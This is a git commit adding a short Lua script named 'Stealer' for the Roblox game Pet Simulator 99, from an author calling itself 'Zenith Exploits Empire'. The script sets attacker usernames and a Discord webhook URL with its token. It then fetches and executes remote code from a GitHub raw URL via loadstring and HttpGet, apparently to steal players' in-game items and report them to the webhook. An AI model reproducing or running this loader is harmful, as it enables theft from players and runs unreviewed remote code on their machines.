152594578adb1b773e5eac71e06725366a392e91
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-21 09:01:07 +0200

    Added ps99 script: Stealer

---
+++ ps99/Stealer.lua
@@ -0,0 +1,5 @@
+Username = "S6anity"
+Username2 = "S6anity"
+Webhook = "https://discord.com/api/webhooks/1361933247185027072/zAQKB88tU6kYKHH0nZ8QqecpvmnPoccEQzzRNfFlgJv4hXO7eTm7sovQp9XP1JQZNOBc"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
